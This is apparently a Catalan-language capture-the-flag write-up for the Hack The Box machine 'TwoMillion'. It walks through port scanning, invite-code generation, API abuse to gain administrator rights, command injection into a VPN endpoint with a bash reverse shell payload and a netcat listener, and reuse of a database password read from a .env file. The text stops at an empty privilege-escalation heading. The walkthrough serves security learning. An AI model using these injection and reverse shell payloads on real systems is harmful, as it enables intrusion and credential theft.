<p align="center">
  <img src="https://github.com/user-attachments/assets/67d6ce83-549a-4d19-bf3f-9e20ff2fb6bb" alt="twomillion-htb-header" width="700" height="500">
</p>

---
## NMAP Scanning
Escaneig a través d'enviament de paquets TCP SYN a tots els ports del host per detectar quins estan oberts.
````bash
> nmap -p- --open -sS -v -n --min-rate=5000 -Pn -n 10.10.11.221

Host is up (0.072s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.52 seconds
           Raw packets sent: 65562 (2.885MB) | Rcvd: 65562 (2.622MB)
````
Amb els ports resultants de l'escaneig anterior, enumerar la versió i llençar els scripts per defecte de NMAP.
````bash
> nmap -sCV -p22,80 -Pn 10.10.11.221

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
````
Buscant la versió de SSH al launchpad d'Ubuntu ja es pot extreure que, segurament, el host té un Ubuntu Jammy. D'altra banda, sabem que s'està aplicant _Virtual Hosting_ i, per tant, s'ha d'afegir el domini 2million.htb a l'arxiu /etc/hosts per a que resolgui a la IP que pertoca.

## Web enumeration

````bash
> wfuzz -c -t 20 --hc=401,301 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://2million.htb/FUZZ

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://2million.htb/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                          
=====================================================================

000000039:   200        80 L     232 W      3704 Ch     "login"                                                                                                                                          
000000024:   302        0 L      0 W        0 Ch        "home"                                                                                                                                           
000000051:   200        94 L     293 W      4527 Ch     "register"                                                                                                                                       
000001012:   401        0 L      0 W        0 Ch        "api"                                                                                                                                            
000001211:   302        0 L      0 W        0 Ch        "logout"                                                                                                                                         
000001545:   200        45 L     152 W      1674 Ch     "404"                                                                                                                                            
000007259:   200        45 L     152 W      1674 Ch     "0404"                                                                                                                                           
000007922:   200        96 L     285 W      3859 Ch     "invite" 
````
Els directoris que ens interessen són: _login_, _register_, _invite_ i _api_. De moment, no es pot fer res a cap d'aquests, ja que no disposem de credencials vàlides ni de codi d'invitació. Tanmateix, mirant el codi de la pàgina _/invite_ es veu un script de verificació del codi introduït que crida a l'endpoint de l'API _/api/v1/invite/verify_.
````javascript
        $(document).ready(function() {
            $('#verifyForm').submit(function(e) {
                e.preventDefault();

                var code = $('#code').val();
                var formData = { "code": code };

                $.ajax({
                    type: "POST",
                    dataType: "json",
                    data: formData,
                    url: '/api/v1/invite/verify',
                    success: function(response) {
                        if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                            // Store the invite code in localStorage
                            localStorage.setItem('inviteCode', code);

                            window.location.href = '/register';
                        } else {
                            alert("Invalid invite code. Please try again.");
                        }
                    },
                    error: function(response) {
                        alert("An error occurred. Please try again.");
                    }
                });
            });
        });
````
També es veu que executa un fitxer de JavaScript a la ruta _/js/inviteapi.min.js_, en el qual, a banda de l'endpoint _verify_, trobem un altre per generar un codi: _generate_. Per tant, es dedueix que per generar un codi hem de fer una petició a l'endpoint _/api/v1/invite/generate_. Tanmateix, una petició per GET retorna un codi d'error 405 dient que el mètode no està permès però provant la mateixa petició amb el mètode POST retorna un codi d'invitació en format base64.

![image](https://github.com/user-attachments/assets/66679475-d9e7-4814-bb84-b55a26a5eb52)

````bash
> echo "VVpXQ0ctWlBGVjQtTTI5Q1YtWUVRRjQ=" | base64 -d
UZWCG-ZPFV4-M29CV-YEQF4
````
I ja ens podem registrar :)

## Initial Foothold
Amb la sessió ja iniciada, una petició a la ruta _/api/v1_ retorna una descripció de totes les opcions de l'API i els mètodes que permet cadascuna.

![image](https://github.com/user-attachments/assets/8f03fde9-6a35-4fc3-bc35-0067bf07b33f)

Una d'aquestes és _/api/v1/admin/settings/update_, que mitjançant el mètode PUT permet actualitzar les dades d'un usuari, inclús si és administrador o no. Jugant amb les respostes que dóna cada petició, s'arriba a una petició final que permet convertir-nos en administrador.

![image](https://github.com/user-attachments/assets/dd5222fc-b315-4f4c-b39e-7ea8131c42e3)

I ara, si llancem una petició GET a _/api/v1/admin/auth_, veurem que som administradors.

![image](https://github.com/user-attachments/assets/519fa0c0-fed6-4a81-a761-639a71d25e8a)

Una altra opció de l'API és generar una VPN per a qualsevol usuari, a través de peticions POST. Com és un host Linux, es pot suposar que per darrere hi ha una execució de comandes a nivell de sistema per generar la VPN, així que es pot dur a terme una injecció de comandes si l'input no està sanititzat, de la següent forma:
````php
<?php sytem($_GET['VPN command ;command injection']); ?>
````
Així doncs, provem de ficar-nos en escolta per la interfície _tun0_ per rebre possibles traces ICMP i de fer un ping a la nostra màquina atacant per veure si aconseguim establir una connexió.
![image](https://github.com/user-attachments/assets/a4efc331-93da-4b3e-8527-b5ec2e403c00)
````bash
> sudo tcpdump -i tun0 icmp

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:30:56.547888 IP 2million.htb > 10.10.16.68: ICMP echo request, id 3, seq 1, length 64
13:30:56.547905 IP 10.10.16.68 > 2million.htb: ICMP echo reply, id 3, seq 1, length 64
````
I com veiem que hem rebut la traça de tornada, podem establir una reverse shell.

**- Atacant:** nc -lvnp 4321

**- POST data:** { "username":"admin;/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.68/4321 0>&1'" }

![image](https://github.com/user-attachments/assets/5f5a966c-d81e-4de9-bc2e-cfd0c2e9a998)

Hem aconseguit una reverse shell com l'usuari _www-data_.

## User

Només hi ha 3 usuaris que poguem accedir al host: _root_, _www-data_ i _admin_. Per aconseguir la flag d'usuari, hem de poder convertir-nos en l'usuari admin.
````bash
> cat /etc/passwd | grep 'sh$'

root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/bin/bash
admin:x:1000:1000::/home/admin:/bin/bash
````
En el directori on hi ha allotjada la web hi ha un arxiu ocult .env que té les credencials de la base de dades per l'usuari _admin_. Podem intentar autenticar-nos per SSH (per comoditat, ja que tindrem una consola amb millor experiència d'usuari) utilitzant aquestes credencials, per comprovar si hi ha hagut reutilització de contrasenyes.
````bash
> cat .env

DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
````

I podem veure que sí que n'hi ha hagut.

![image](https://github.com/user-attachments/assets/fdea7bda-92d8-4fb7-87b4-f358cb8392ec)


## Privilege escalation
